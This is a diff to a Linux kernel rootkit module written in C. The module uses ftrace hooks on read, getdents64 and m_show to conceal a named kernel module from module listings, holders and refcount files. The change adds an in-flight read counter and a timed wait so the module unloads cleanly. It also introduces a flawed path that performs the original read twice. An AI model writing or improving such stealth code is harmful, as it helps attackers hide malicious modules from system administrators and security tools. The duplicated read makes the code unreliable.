@@ -2,13 +2,17 @@
 #include <linux/kernel.h>
 #include <linux/slab.h>
 #include <linux/ftrace.h>
-#include <net/inet_sock.h>
-#include <linux/kallsyms.h>
+#include <linux/file.h>
 #include <linux/dirent.h>
-#include <linux/slab.h>
-#include <linux/uaccess.h>
+#include <linux/jiffies.h>
 #include <stdbool.h>
+#include <linux/sched.h>
+#include <linux/wait.h>
 #include "../common/ftrace_hooking/ftrace_hook.h"
+#include "../common/waitable_counters/waitable_counter.h"
+
+static int unload_timeout_msec = 10000; /* 10 seconds */
+module_param(unload_timeout_msec, int, 0600);
 
 static char *mod_name_to_hide;
 module_param(mod_name_to_hide, charp, 0600);
@@ -24,6 +28,7 @@ static char *holders_path = "/holders";
 typedef ssize_t  (*original_read_t)(const struct pt_regs *regs);
 static struct fthook read_hook;
 static char *refcount_path = "/refcnt";
+DECLARE_WAIT_QUEUE_HEAD(read_wq);
 
 // m_show hook
 typedef int (*original_m_show_t)(struct seq_file *seq, void *v);
@@ -49,12 +54,21 @@ bool already_uses(struct module *a, struct module *b)
 
 #pragma region read_hook
 ssize_t new_read(const struct pt_regs *regs) {
-    original_read_t original_read_ptr = (original_read_t)read_hook.original_function_address;
+    struct task_struct *task = current;
+    bool is_rmmod = !strcmp(task->comm, "rmmod");
+    if (!is_rmmod) {
+        increment();
+    }
 
+    original_read_t original_read_ptr = (original_read_t)read_hook.original_function_address;
     int bytes_read = original_read_ptr(regs);
+
     struct file *file = fget((int)regs->di);
     if (file == NULL) {
-        return bytes_read;
+        if (!is_rmmod) {
+            decrement(&read_wq);
+        }
+        return original_read_ptr(regs);
     }
 
     char *allocated_path_pointer = kmalloc(PATH_MAX, GFP_KERNEL);
@@ -90,6 +104,9 @@ ssize_t new_read(const struct pt_regs *regs) {
     
     kfree(allocated_path_pointer);
     fput(file);
+    if (!is_rmmod) {
+        decrement(&read_wq);
+    }
     return bytes_read;
 }
 #pragma endregion read_hook
@@ -200,7 +217,8 @@ void unload(void) {
     remove_hook(&getdents64_hook);
     remove_hook(&read_hook);
 
-    pr_info("Goodbye world...");
+    long timeout = msecs_to_jiffies(unload_timeout_msec);    
+    wait_event_timeout(read_wq, read_counter() == 0, timeout);
 }
 
 module_init(load);
